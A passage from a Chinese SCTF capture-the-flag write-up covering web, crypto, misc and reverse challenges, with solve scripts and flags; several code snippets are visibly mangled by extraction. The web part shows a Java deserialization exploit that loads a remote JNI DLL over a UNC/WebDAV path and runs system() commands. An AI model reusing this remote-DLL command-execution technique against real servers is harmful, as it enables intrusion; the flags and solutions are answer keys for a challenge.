jar 里，所以要从网络上加载 dll。 这里利用 System.load 的一个特性——可以使用 UNC 路径，加载远程的 dll。 为什么可以使用 UNC 呢？来看下 System.load 的调用过程。 System.load 调用了 Runtime.getRuntime().load0 1.Runtime.getRuntime().load0 在这里会判断 filename 是否是一个绝对路径，如果不是就直接抛出异常，是就进一步加载。 1.File.isAbsolute 再看看 File 是如何判断是否是绝对路径的。 根据描述，linux下要求以 / 开头。windows下，要求以盘符或者 \\\\\\\\开头。 emm 综上，所以这里可以使用 UNC 路径。 下面是另一个坑，UNC 默认是走 445 端口的，如果没有特殊情况，公网上都是屏蔽了这个端口的。 这里利用 windows 一个特性，在开启了 webclient 服务的情况下，UNC 访问 445 失败时，会尝试访问目标服务器80端口的 webdav 去加载资源 (‾◡◝)， 这一点 hint 已经提示过了。 EXP 类 R. public class R { static { System.load(\"\\\\xxx.xxx.xxx.xxx\\JNI.dll\"); } public static native void exec(String cmd); public R(String cmd) { exec(cmd); } } 执行命令 c R. jar cvf R.jar R.class 将打包的 R.jar 放到服务器上的 web 服务下。 DLL R.h ifdef __cplusplus extern \"C\" { endif JNIEXPORT void JNICALL _R_exec (JNIEnv *, jclass, jstring); ifdef __cplusplus } endif endif R.cpp include \"R.h\" include JNIEXPORT void JNICALL _R_exec (JNIEnv env, jclass clazz, jstring str) { char cmd= (char*)env->GetStringUTFChars(str,JNI_FALSE); system(cmd); env->ReleaseStringUTFChars(str,cmd); } 编译成 dll，放到服务器的 webdav 服务下。 用https://github.com/Jayl1n/ysoserial/blob/master/src/main//ysoserial/payloads/CommonsCollections8. 构造序列化 payload，贴到 cookie 里打一发，完事儿~ Crypto babygame 作者：De1ta、来源：安全客 题目首先需要proof_of_work，要求m和rsa加密m之后再解密的结果不相同，让m比n大即可绕过 进入系统之后有两个选项 1.随机生成三组不同的a，b，n，使用相同的e=3，使得c=pow(a*m+b,e,n)，然后会给我们三组不同的a，b，n和c。最后再使用aes_ofb加密m，将结果也给我们。其中aes的iv和key都是随机生成的 2.我们需要输入aes_ofb加密之后的m的结果，其中m需要将其中的afternoon替换为morning，如果构造的正确则返回flag 解题思路： 1.通过Broadcast Attack with Linear Padding解出m为”I will send you the ticket tomorrow afternoon” 2.将m，修改后的m，以及aes_ofb加密之后的m的结果进行异或，得到的最终结果就是修改后的m进行aes_ofb加密之后的结果。将此结果发送给服务器便得到flag sctf{7h15_ch4ll3n63_15_n07_h4rd_f0r_y0u_r16h7?} 解题脚本: 1.hastads.sage def hastads(cArray,nArray,e=3): \"\"\" Performs Hastads attack on raw RSA with no padding. cArray = Ciphertext Array nArray = Modulus Array e = public exponent \"\"\" if(len(cArray)==len(nArray)==e): for i in range(e): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) M = crt(cArray,nArray) return(Integer(M).nth_root(e,truncate_mode=1)) else: print(\"CiphertextArray, ModulusArray, need to be of the same length, and the same size as the public exponent\") def linearPaddingHastads(cArray,nArray,aArray,bArray,e=3,eps=1/8): \"\"\" Performs Hastads attack on raw RSA with no padding. This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i]) Where they are all encryptions of the same message. cArray = Ciphertext Array nArray = Modulus Array aArray = Array of 'slopes' for the linear padding bArray = Array of 'y-intercepts' for the linear padding e = public exponent \"\"\" if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e): for i in range(e): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) TArray = [-1]*e for i in range(e): arrayToCRT = [0]*e arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P. = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*e for i in range(e): gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i],e) - cArray[i]) g = sum(gArray) g = g.monic() # Use Sage's inbuilt coppersmith method roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(\"No Solutions found\") return -1 return roots[0] else: print(\"CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,\" + \"and the same size as the public exponent\") def LinearPadding(): import random import binascii e = 3 nArr = [ 0x81e620887a13849d094251e5db9b9160d299d2233244876344c0b454c99f7baf9322aa90b371f59a8ed673f666137df1f1e92d86e7b036479a2519827a81c7648543e16d4d0a334d0aa1124ad4c794298c3a227abfe1d44470ad4649609630450cb83f42f68ff2c445aaf546483b7a2b0a6e5877634ace5e640f8d8cbdc6a379, 0x6c7c7935c58a586cf45e2e62ee51f6619ae2f6a7cef3865ed40a0d62ec31ba612e81045bcc6e50aa41d225b0f92b0d4a40051e2cf857ba61e91619e8fb3e2691d276c1abb5231c8012deb449e85752d2a02119bb186da6f7d41d704261284b395eec17ed4a2b07d1b97e34db8164e3093dd6cffbb0119ef8b3e9e960b0d96d05, 0x5e67f4953462f66d217e4bf80fd4f591cbe22a8a3eac42f681aea880f0f90e4a34aca250b01754dd49d3b7512011609f757cbaf8ae7c97d5894fb92fb36595aff4a1303d01e5c707284bbfdc20b8378e046650675353e471853fa294f779df7b1b3f7cbe1748c2109d22cea682b01cb2c7719df03783e66cc3e44889a002c517] cArr = [ 0x3512b763bab0b45b2c6941cccd550c8b2628cea0f162dc3902951e48115d58d16ea25075da6331617e7a4ac6062190f8ce91c65c91cff57a845a21d2ebd792b46bdcb666bc4aeab2232f990956084003b652664444ba0255dbab16620b2b232a1a4e6ec04e24249ff7ba33c70cb98c50d1f46bed076c53e2c95d0ec7dee5ad2f, 0x36bfe6fba6f34b93a0d2d44c890dfe44afc715a586bc1a44aa184571bb88a238187024b36b22a1f52a64f553fb52cf7ce193937e047307dd62e4c980601a3d20b1fbfe69888992726b11bf20330e48e4a64c6d4825d1c6d058d745f5a709c2ab5ac86da1feacf13e9de2237426b70a17a56d201b4743c68b70fdd4c7ce5eaa3, 0x4961ba65469dfc17e663af04dfb8eeee16c61df4f85971495d0c7e7061040602638963651791cfad28992312309c3179da27babf2a80fe41c062b21aa922da53bd793c614a0974ec5e5e18f9696df875e98aceef17d476d7615ea304e7e9869696711016151666f6b58f31241c590b3b313009434b444bcb7694bb8309d89475] aArr = [ 0xd0f458bc246d88f38e78076b36ad58981928594035b9e428401dc3ccf049a8012926dffb5be9fa225e8e128370581acc79ee24fa259d4ea895ce61d3d607ed2b, 0xfbedf9c34170262e2ed0eee7512e935715400a8ce541285c98e5269d2cdf4dc1aa81e117bf5d62a3310064376e8c3d5d5c4fa67e5a434ad93e5875eaa7be9545, 0xa2995200a4f252d7ba9959a3b7d51c4b138f3823869f71573f4ab61c581ce8879d40396a33ddc32a93fd100a1029dba53e41a0acbe9e023a0bf51c6e4ddc911d] bArr = [ 0xc2a6d47dc16824c86e92a9e88a931d215846052fe6787c11d0fcd9f4dde28f510707c33948290f69644a7fa64075d85e7761cfff3c627ee5156a03bd9f241c51, 0xc2343fdbb6a351b387174db494e03d0879bea084e65b16f3f0ad106472bd3974813aec28a01fcceeae00db6d38b6c32bb6ce900dff236ae9c5814ad089591115, 0xc4a2fb937c7441be58bfcb06208e0987423ab577041d0accf1f446545b9ebb7e4874fc56597ab1b842bb50e364a62f07a0afe7d6eff7a805361f8d3a12e79d65] randUpperBound = pow(2,500) msg = linearPaddingHastads(cArr,nArr,aArr,bArr,e=e,eps=1/8) msg = hex(int(msg))[2:] if(msg[-1]=='L'): msg = msg[:-1] if(len(msg)%2 == 1): msg = '0' + msg print(msg) print(binascii.unhexlify(msg)) if __name__ == '__main__': LinearPadding() 2.exp.py HOST = \"47.240.41.112\" PORT = 54321 from Crypto.Util.strxor import strxor from pwn import * def pad(msg): pad_length = 16 - len(msg) % 16 return msg + chr(pad_length) * pad_length r = remote(HOST, PORT) ru = lambda x : r.recvuntil(x) rl = lambda : r.recvline() sl = lambda x : r.sendline(x) # Give a large number bigger than n to break proof_of_work ru('{65537, ') n = ru('L}').strip('L}') n = int(n[2:],16) ru('Give me something you want to encrypt:') sl(str(n**2)) # pad the message and target message we got in the first step msg = pad(\"I will send you the ticket tomorrow afternoon\") target_msg = pad(\"I will send you the ticket tomorrow morning\") ru('message') sl('1') ru('this:') message = ((ru('n').strip(' ')).strip('n')).decode('hex') ru('message') # message xor enc_message = middle_key_stream, middle_key_stream xor target_message = enc_target_message, so enc_target_message = xor(message,enc_message,target_message) enc_target_message = strxor(strxor(target_msg,message),msg).encode('hex') # choice 2 and send enc_target_message to get flag sl('2') ru('now:') sl(enc_target_message) flag = ru('}') print \"[+]FLAG IS: \"+flag r.close() warmup 知识点：代码审计，AES加密 附件： 156129204983f46d45981f08ab9fa977a24d3c70ec.zip 步骤： 1.打开审计一下源码，发现是 AES 加密。 #!/usr/bin/python # -*- coding: utf-8 -*- from Crypto.Cipher import AES from Crypto.Util.strxor import strxor from Crypto.Random import get_random_bytes from FLAG import flag class MAC: def __init__(self): self.key = get_random_bytes(16) self.iv = get_random_bytes(16) def pad(self, msg): pad_length = 16 - len(msg) % 16 return msg + chr(pad_length) * pad_length def unpad(self, msg): return msg[:-ord(msg[-1])] def code(self, msg): res = chr(0)*16 for i in range(len(msg)/16): res = strxor(msg[i*16:(i+1)*16], res) aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.encrypt(res).encode('hex') def identity(self, msg, code): if self.code(msg) == code: msg = self.unpad(msg) if msg == 'please send me your flag': print 'remote: ok, here is your flag:%s' % flag else: print 'remote: I got it' else: print 'remote: hacker!' if __name__ == '__main__': mac = MAC() message = 'see you at three o\\'clock tomorrow' print 'you seem to have intercepted something:{%s:%s}' %(mac.pad(message).encode('hex'), mac.code(mac.pad(message))) print 'so send your message:' msg = raw_input() print 'and your code:' code = raw_input() mac.identity(msg.decode('hex'), code) exit() 先给出了一段明文的 hex 和其加密之后的 hex，然后要求给出一段明文和其对应的密文，然后就就判断其为 “please send me your flag” 且密文正确的话就给出 flag。 这里很有意思的是这里 def code(self, msg): res = chr(0)*16 for i in range(len(msg)/16): res = strxor(msg[i*16:(i+1)*16], res) aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.encrypt(res).encode('hex') 对明文进行异或摘要到 16 位之后，才进行加密的。 那么既然我们已知一组明文和密文，而且可以推算出其异或摘要之后获得的密钥，那么只要让我们传上去的明文摘要之后和前一组明文一致，那么就可以用前一组的密文来通过验证了。 2.对上面这个脚本进行改造，得到如下 POC 生成器， #!/usr/bin/python # -*- coding: utf-8 -*- from Crypto.Cipher import AES from Crypto.Util.strxor import strxor from Crypto.Random import get_random_bytes flag = \"fuck\" class MAC: def __init__(self): self.key = get_random_bytes(16) self.iv = get_random_bytes(16) def pad(self, msg): pad_length = 16 - len(msg) % 16 return msg + chr(pad_length) * pad_length def unpad(self, msg): return msg[:-ord(msg[-1])] def code(self, msg): res = chr(0)*16 # 最终目的 res 相等 24054d4c1a0f19444e0f4016080f1805 for i in range(len(msg)/16): res = strxor(msg[i*16:(i+1)*16], res) aes = AES.new(self.key, AES.MODE_CBC, self.iv) print(res.encode('hex')) return aes.encrypt(res).encode('hex') def identity(self, msg, code): if self.code(msg) == code: msg = self.unpad(msg) if msg == 'please send me your flag': print 'remote: ok, here is your flag:%s' % flag else: print 'remote: I got it' else: print 'remote: hacker!' if __name__ == '__main__': mac = MAC() message = 'see you at three o\\'clock tomorrow' print 'you seem to have intercepted something:{%s:%s}' %(mac.pad(message).encode('hex'), mac.code(mac.pad(message))) print 'so send your message:' msg = 'please send me your flag' print(msg) msg_o = msg + chr(63 - len(msg)) * (63 - len(msg)) res = chr(0)*16 for i in range(len(msg_o)/16 - 1): res = strxor(msg_o[i*16:(i+1)*16], res) msg_o = msg_o[:32] + strxor(\"24054d4c1a0f19444e0f4016080f1805\".decode('hex'), res) + msg_o[48:] print(msg_o.encode('hex')) print 'and your code:' code = raw_input() mac.identity(msg.decode('hex'), code) exit() 解释一下，可以看到 code 那里我加了个 print ，输出第一组明文的十六位摘要和第二组明文的十六位摘要。 而后对第二组明文进行二次摘要，对其加上一段十六位文本，让其异或之后与第一段明文的十六位摘要相等。再加上 1~15 个 pad，最后处理时利用 pad 保留下我们需要的文本 ‘please send me your flag’。 【前 32 位不用动】【32~48 位 拿来和前面异或，使得和前面已知密文的明文摘要一致】【48~（49~63） 位 拿来 padding，不是 64 位就是为了让这一段不参与前面的摘要计算，保证最后一位可控】 运行，得到这段明文。 3.连接靶机，将明文和靶机返回的第一组明文提交，得到 flag。 Flag 到手~ MISC 作者：De1ta、来源：安全客 签到 关注公众号，cat /flag 头号玩家 一直往上走flag就出来了 sctf{You_Are_The_Ready_Player_One!!!For_Sure!!!} Maaaaaaze 找迷宫中任意两点最大路径 最后答案是4056 把html处理一下，然后任意取一个点作为起点，扔到dfs里跑最长路径，等跑不动的时候拿当前最长路径的重点作为起点再扔进去跑，来回几次就得到4056了 exp.py import sys sys.setrecursionlimit(100000) file = open(\"sctfmaze.txt\") maze = [[0 for j in range(0, 100)] for i in range(0, 100)] vis = [[0 for j in range(0, 100)] for i in range(0, 100)] class Node: t = 0 r = 0 b = 0 l = 0 #print maze for line in file: a = line[:-1].split(\" \") #print a n = Node() for i in range(2,len(a)): #print a[i], if a[i] == '0' : n.t = 1 if a[i] == '1' : n.r = 1 if a[i] == '2' : n.b = 1 if a[i] == '3' : n.l = 1 #print a[i], #print maze[int(a[0])][int(a[1])] = n #print a[0],a[1],maze[int(a[0])][int(a[1])].b #exit() def check(i,j): if i>=100 or i=100 or jmaxx: print n,i,j #print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l maxx = n if check(i-1,j) and maze[i][j].t == 0: vis[i-1][j] = 1 dfs(i-1,j,n) vis[i-1][j] = 0 if check(i,j+1) and maze[i][j].r == 0: vis[i][j+1] = 1 dfs(i,j+1,n) vis[i][j+1] = 0 if check(i+1,j) and maze[i][j].b == 0: vis[i+1][j] = 1 dfs(i+1,j,n) vis[i+1][j] = 0 if check(i,j-1) and maze[i][j].l == 0: vis[i][j-1] = 1 dfs(i,j-1,n) vis[i][j-1] = 0 vis[70][22] = 1 dfs(70,22,0) exit() for i in range(0,100): for j in range(0,100): #print i,j vis[i][j] = 1 dfs(i,j,0) vis[i][j] = 0 打开电动车 根据这篇文章 http://www.kb-iot.com/post/756.html 可知钥匙信号(PT224X) = 同步引导码(8bit) + 地址位(20bit) + 数据位(4bit) + 停止码(1bit) 用audacity打开信号文件，信号为 011101001010101001100010 这里题目截取到的信号中不包括同步码，前20位即为地址码，即为flag sctf{01110100101010100110} Re 作者：De1ta、来源：安全客 Who is he 基于unity开发的游戏，实际只有一个视频播放器，输入框和一个确认框。 找了下资料，默认_dataManagedAssembly-CSharp.dll应该是存放主逻辑的地方。dnspy一把梭。 只是一个DES CBC模式的加密，密文密钥都有，初始iv和key相同。注意C#里面字符串默认是Unicode，密钥是”1234“，每个字符后面都要加”x00”。 import base64 from Crypto.Cipher import DES key = b\"1x002x003x004x00\" des = DES.new(key, mode = DES.MODE_CBC, iv = key) cipher = b\"1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==\" cipher = base64.b64decode(cipher) plain = des.decrypt(cipher)[0:-8].decode(\"utf-16\") print(plain) 解出来得到 He_P1ay_Basketball_Very_We11!Hahahahaha! 交一下发现不对，找了半天好像这个dll里没什么奇怪的地方了。 后面用ce，直接暴力搜索”Emmmmm” 搜到不止一个结果，在内存中查看一下有新的收获，这里base64的部分和之前dll里的不一样！一共有两个地方不同，先尝试直接解密。第一个得到： Oh no!This is a trick!!! 第二个不知base64改了，key也改成了test。 解密之后得到： She_P1ay_Black_Hole_Very_Wel1!LOL!XD! 提交正确。脚本： import base64 from Crypto.Cipher import DES key = b\"tx00ex00sx00tx00\" # print(a) # print(key) des = DES.new(key, mode = DES.MODE_CBC, iv = key) a = b\"xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=\" a = base64.b64decode(a) res = des.decrypt(a)[0:-6].decode(\"utf-16\") print(res) 继续在ce的内存中翻找，可以看到pe头。把整个dll dump下来，再丢尽dnspy，可以看到内容基本一致。 Creakme main开头第一个函数进行SMC。先查找区段.SCTF，然后调用DebugBreak下断点。猜测是通过调试器附加的方式来修改。之后进入sub_402450进行SMC。 很容易写个脚本还原： from ida_bytes import get_bytes, patch_bytes st = 0x404000 key = map(ord,list(\"sycloversyclover\")) for i in range(512): tmp = ord(get_bytes(st,1)) tmp^=key[i%16] tmp = ~tmp patch_bytes(st,chr(tmp)) st+=1 修改的函数sub_404000在接下来的sub_4024A0中被调用到，可以发现它将之后的一串字符串修改为base64字符串 后面加密部分，很容易看出AES CBC，密文密钥初始向量都有 from base64 import b64decode from Crypto.Cipher import AES key = b\"sycloversyclover\" iv = b\"sctfsctfsctfsctf\" aes = AES.new(key, mode = AES.MODE_CBC, iv = iv) res = b\"nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=\" cipher = b64decode(res) tmp = aes.decrypt(cipher) print(tmp) 得到flag: sctf{Ae3_C8c_I28_pKcs79ad4} babyre 有几个简单的花指令。 主逻辑很清晰，三部分password。 第一部分为555的迷宫，wasd上下左右，xy在z轴方向上下移动。 ***** *..** *..** ***** ***** ***** ****. *..** ***** **..* ****. ****. ..#*. ***** *...* ****. ***** .***. ***** ..*.* **s.. ***** .***. .**.. .**.* 直接看出路径来： ddwwxxssxaxwwaasasyywwdd 第二部分就是base64 c2N0Zl85MTAy 第三部分为一个简单的对称加密，直接逆回来: #include\"stdio.h\" #include\"string.h\" #define ROL(x, r) (((x) > (32 - (r)))) #define ROR(x, r) (((x) >> (r)) | ((x) >8)&0xff; byte[2] = (a1>>16)&0xff; byte[3] = (a1>>24)&0xff; v1 = (a[byte[0]])|(a[byte[1]]=0;i--) tmp[i] = foo(tmp[i+4],tmp[i+1],tmp[i+2],tmp[i+3]); tmp[4] = 0; printf(\"%sn\",(char *)tmp); return 0; } fl4g_is_s0_ug1y! 得到flag sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)} strange apk 前12个chr localObject2 = new StringBuilder(); ((StringBuilder)localObject2).append(paramAnonymousView); ((StringBuilder)localObject2).append(str.charAt(i)); paramAnonymousView = ((StringBuilder)localObject2).toString(); i++; if (((String)localObject2).equals(\"c2N0ZntXM2xjMG1l\")) >>> base64.b64decode(\"c2N0ZntXM2xjMG1l\") 'sctf{W3lc0me' 有个data加密后的，直接虚拟机打开存着解密后的apk，拖下来直接分析。 后18个chr： 这里先用intent启动了其他class： localObject1 = new Intent(); ((Intent)localObject1).putExtra(\"data_return\", paramAnonymousView); s.this.setResult(-1, (Intent)localObject1); s.this.finish(); 最后一段关键比较： if (f.encode(paramIntent.getStringExtra(\"data_return\"), (String)localObject1).equals(\"~8t808_8A8n848r808i8d8-8w808r8l8d8}8\")) 这里生成MD5： try { Object localObject2 = MessageDigest.getInstance(\"MD5\"); ((MessageDigest)localObject2).update(\"syclover\".getBytes()); BigInteger localBigInteger = new java/math/BigInteger; localBigInteger.(1, ((MessageDigest)localObject2).digest()); localObject2 = localBigInteger.toString(16); localObject1 = localObject2; } catch (Exception localException) { localException.printStackTrace(); } 照着写了个函数： public static void genMd5(){ String plaintext = \"syclover\"; try{ MessageDigest m = MessageDigest.getInstance(\"MD5\"); m.reset(); m.update(plaintext.getBytes()); byte[] digest = m.digest(); BigInteger bigInt = new BigInteger(1,digest); String hashtext = bigInt.toString(16); System.out.print(hashtext); } catch (Exception localException) { localException.printStackTrace(); } } 得到8bfc8af07bca146c937f283b8ec768d4 那个关键比较有个encode函数： public static String encode(String paramString1, String paramString2) { int i = paramString1.length(); int j = paramString2.length(); StringBuilder localStringBuilder = new StringBuilder(); for (int k = 0; k 出题人好像把取整跟取余搞混了。应该是k % j 这样的话，直接在flag里插入8得到字符串：~8t808_8A8n848r808i8d8-8w808r8l8d8}8 所以后半段flag：~t0_An4r0id-w0rld} 所以整个flag: sctf{W3lc0me~t0_An4r0id-w0rld} music cipher = C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53 len(cipher) = 80 用jeb打开，能最终定位到一个关键函数，这个函数输入两个参数 第一个是flag，第二个是hellodsctf字符串的md5，输出为cipher。 直接爆破每一位 import java.lang.String; public class Main { public static void main(String[] args) { c a = new c(); String flag = \"sctf{\"; String printable = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;?@[]^_{|}~\"; String ss = \"C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53\"; for(int j=0;j ojbk 出题人：0xpoker 解题人数：0 最终分数：1000 备注: python加密脚本 python import os import sys import struct big_box = [0x16A7ACAC, 0x47B82F2F, 0xAE316666, 0x89F10101, 0x9A084545, 0xFD985252, 0x3562CCCC, 0x3FDE7575, 0x56F7DCDC, 0x7532BCBC, 0x4FB22121, 0x9359A4A4, 0x03ED5858, 0xB896CACA, 0x3D68C2C2, 0xE26E1F1F, 0xFA700D0D, 0xAF6A8989, 0xEF3AF9F9, 0x67901717, 0xB7749B9B, 0x04050707, 0xA7608787, 0xED8C4E4E, 0x44557777, 0xECD7A1A1, 0xCF12C1C1, 0xF5925C5C, 0xBA207D7D, 0x53A93434, 0x1FF64D4D, 0x88AAEEEE, 0xC4F59797, 0x0ABCB9B9, 0xA48DDFDF, 0x6929A9A9, 0xF4C9B3B3, 0x5C4B6565, 0xDE5D3232, 0x0BE75656, 0x02B6B7B7, 0xB62F7474, 0xF321ECEC, 0x76DFE4E4, 0xEE611616, 0x2A948181, 0xC31DC8C8, 0x6F9A1919, 0x0EB9BEBE, 0xD4E18B8B, 0xF99D5555, 0x63951010, 0x551A8484, 0xB9CD2525, 0xC5AE7878, 0x07E85F5F, 0x8E195E5E, 0x368F9494, 0x1945FDFD, 0xE730F7F7, 0xBF7E9595, 0xC8FA9E9E, 0x2E918686, 0x4EE9CECE, 0x34392323, 0xF8C6BABA, 0x7D38B2B2, 0x38362A2A, 0x85FE0808, 0xF0CCB4B4, 0x43BD2828, 0x50446C6C, 0xCA4C2929, 0xB499C3C3, 0xE9894949, 0xD70CD3D3, 0xD0E48C8C, 0x055EE8E8, 0x3167CBCB, 0x6C774141, 0x181E1212, 0x450E9898, 0xF724EBEB, 0xDF06DDDD, 0x9DE01A1A, 0xBB7B9292, 0xCE492E2E, 0xB5C22C2C, 0x5AF8D5D5, 0x4D049696, 0x1D40FAFA, 0xCDA47676, 0x6B9F1E1E, 0x80A0E0E0, 0x8DF40606, 0xD9B56D6D, 0x96074C4C, 0x95EA1414, 0xA63B6868, 0x52F2DBDB, 0x647D4F4F, 0x92024B4B, 0x13F94444, 0xD5BA6464, 0x9B53AAAA, 0xE4DDAFAF, 0xC6432020, 0x12A2ABAB, 0x9F56ADAD, 0xB3719C9C, 0xBDC82222, 0xA3658080, 0x6D2CAEAE, 0x242D3F3F, 0x303C2424, 0xD2523B3B, 0x6EC1F6F6, 0x81FB0F0F, 0xAA346161, 0x14111B1B, 0x3C332D2D, 0x62CEFFFF, 0x82165757, 0xA9D93939, 0x114FF3F3, 0x3A809D9D, 0x975CA3A3, 0x706C5454, 0xA5D63030, 0x5FA63D3D, 0x49019191, 0x00000000, 0x584E6262, 0x74695353, 0x9CBBF5F5, 0x2BCF6E6E, 0xE335F0F0, 0x8CAFE9E9, 0x72DAE3E3, 0x37D47B7B, 0xA1D33737, 0x834DB8B8, 0x73810C0C, 0x1C1B1515, 0x2979D9D9, 0xAC87D1D1, 0xDA583535, 0x6526A0A0, 0x5D108A8A, 0x4AECC9C9, 0xA882D6D6, 0x5EFDD2D2, 0xDDB06A6A, 0xBC93CDCD, 0x10141C1C, 0xB1C72B2B, 0x4BB72626, 0x28223636, 0x3E859A9A, 0xBE257A7A, 0x86135050, 0x06B3B0B0, 0x2576D0D0, 0xEB3FFEFE, 0x8F42B1B1, 0xE8D2A6A6, 0xB09CC4C4, 0x0FE25151, 0x4C5F7979, 0x7137BBBB, 0x60784848, 0x2D7CDEDE, 0xF27A0303, 0x40507070, 0x015BEFEF, 0x0C0F0909, 0x7F8E0505, 0x229E8F8F, 0x328A9393, 0x77840B0B, 0xFCC3BDBD, 0x17FC4343, 0xD6573C3C, 0xE5864040, 0x7AD0EDED, 0x6123A7A7, 0xDCEB8585, 0x33D17C7C, 0x2FCA6969, 0xFB2BE2E2, 0x2173D7D7, 0x78665A5A, 0x0951E1E1, 0x0D54E6E6, 0x94B1FBFB, 0x1AA8A5A5, 0x2C273131, 0x8A1C5959, 0x269B8888, 0xEA641111, 0x7ED5EAEA, 0x1BF34A4A, 0x3BDB7272, 0x1EADA2A2, 0xA23E6F6F, 0xF1975B5B, 0x42E6C7C7, 0x54416B6B, 0x66CBF8F8, 0x90B4FCFC, 0xFF2EE5E5, 0x6AC4F1F1, 0xC2462727, 0xA088D8D8, 0xC9A17171, 0xCCFF9999, 0x7C635D5D, 0x59158D8D, 0xE66B1818, 0x396DC5C5, 0x23C56060, 0x84A5E7E7, 0xAB6F8E8E, 0xE1834747, 0x57AC3333, 0xB22A7373, 0x8B47B6B6, 0xFE750A0A, 0x20283838, 0xCB17C6C6, 0xADDC3E3E, 0x511F8383, 0xE0D8A8A8, 0xF67F0404, 0x793DB5B5, 0x154AF4F4, 0x68724646, 0x99E51D1D, 0x7B8B0202, 0xC718CFCF, 0x46E3C0C0, 0x485A7E7E, 0x98BEF2F2, 0xD8EE8282, 0x410B9F9F, 0x9E0D4242, 0xC0F09090, 0x080A0E0E, 0xDB03DADA, 0x27C06767, 0x5BA33A3A, 0xD309D4D4, 0x8748BFBF, 0xC1AB7F7F, 0x91EF1313, 0xD1BF6363, 0x9B9B74B7, 0x3131272C, 0xB6B6478B, 0x94948F36, 0x77775544, 0x29294CCA, 0x7E7E5A48, 0xEDEDD07A, 0x4444F913, 0x59591C8A, 0x8D8D1559, 0xE4E4DF76, 0x07070504, 0x9D9D803A, 0xC2C2683D, 0x2626B74B, 0x19199A6F, 0xB5B53D79, 0xA6A6D2E8, 0x8C8CE4D0, 0xDDDD06DF, 0x50501386, 0x05058E7F, 0x6767C027, 0x0D0D70FA, 0xD6D682A8, 0xEAEAD57E, 0xADAD569F, 0x53536974, 0x7D7D20BA, 0x6969CA2F, 0x7575DE3F, 0x161661EE, 0xDBDBF252, 0xD0D07625, 0xFEFE3FEB, 0x98980E45, 0xBDBDC3FC, 0xCFCF18C7, 0xBFBF4887, 0xA2A2AD1E, 0x04047FF6, 0x23233934, 0x4A4AF31B, 0x92927BBB, 0x10109563, 0xA3A35C97, 0xA4A45993, 0x24243C30, 0xF7F730E7, 0x4E4E8CED, 0x0808FE85, 0x6060C523, 0x3D3DA65F, 0x5D5D637C, 0x6A6AB0DD, 0x616134AA, 0x73732AB2, 0xE3E3DA72, 0x2B2BC7B1, 0x3939D9A9, 0xE7E7A584, 0x91910149, 0x38382820, 0xBCBC3275, 0xCDCD93BC, 0xFDFD4519, 0x5656E70B, 0xF9F93AEF, 0xB2B2387D, 0x65654B5C, 0x8F8F9E22, 0x494989E9, 0x5B5B97F1, 0x525298FD, 0x2C2CC2B5, 0x8686912E, 0xCACA96B8, 0x0B0B8477, 0x7C7CD133, 0x32325DDE, 0x3B3B52D2, 0xFAFA401D, 0x5C5C92F5, 0x00000000, 0x5F5FE807, 0xCBCB6731, 0xD7D77321, 0x2A2A3638, 0x7878AEC5, 0xCCCC6235, 0x6C6C4450, 0xABABA212, 0x4141776C, 0x3A3AA35B, 0xE2E22BFB, 0xDCDCF756, 0x36362228, 0x7A7A25BE, 0x62624E58, 0xF3F34F11, 0xEEEEAA88, 0x7F7FABC1, 0xC0C0E346, 0x0F0FFB81, 0x9C9C71B3, 0x18186BE6, 0x7272DB3B, 0x6363BFD1, 0x5A5A6678, 0xACACA716, 0x3737D3A1, 0xB4B4CCF0, 0xA1A1D7EC, 0x1B1B1114, 0xE8E85E05, 0x2E2E49CE, 0x8A8A105D, 0x89896AAF, 0x4545089A, 0x4B4B0292, 0xD2D2FD5E, 0x79795F4C, 0x9090F0C0, 0x02028B7B, 0x0606F48D, 0x03037AF2, 0x83831F51, 0x1E1E9F6B, 0x9999FFCC, 0xBBBB3771, 0xC7C7E642, 0x1313EF91, 0x9797F5C4, 0x3333AC57, 0x808065A3, 0xAFAFDDE4, 0x9F9F0B41, 0x6B6B4154, 0x0101F189, 0x8282EED8, 0x8B8BE1D4, 0x12121E18, 0x353558DA, 0xF1F1C46A, 0x0E0E0A08, 0x1A1AE09D, 0xA5A5A81A, 0x7B7BD437, 0x404086E5, 0xAEAE2C6D, 0xF0F035E3, 0xC6C617CB, 0x55559DF9, 0xE0E0A080, 0xC1C112CF, 0x95957EBF, 0x15151B1C, 0x5151E20F, 0xAAAA539B, 0xA8A8D8E0, 0x8E8E6FAB, 0x9696044D, 0xD5D5F85A, 0xFCFCB490, 0x6D6DB5D9, 0xDFDF8DA4, 0xDEDE7C2D, 0x3C3C57D6, 0x9A9A853E, 0xA7A72361, 0x09090F0C, 0xD3D30CD7, 0x272746C2, 0x57571682, 0x2525CDB9, 0x17179067, 0x666631AE, 0x48487860, 0xB8B84D83, 0x3E3EDCAD, 0x0C0C8173, 0xBABAC6F8, 0xB1B1428F, 0xB9B9BC0A, 0x54546C70, 0x42420D9E, 0x2121B24F, 0x8181942A, 0xE1E15109, 0x84841A55, 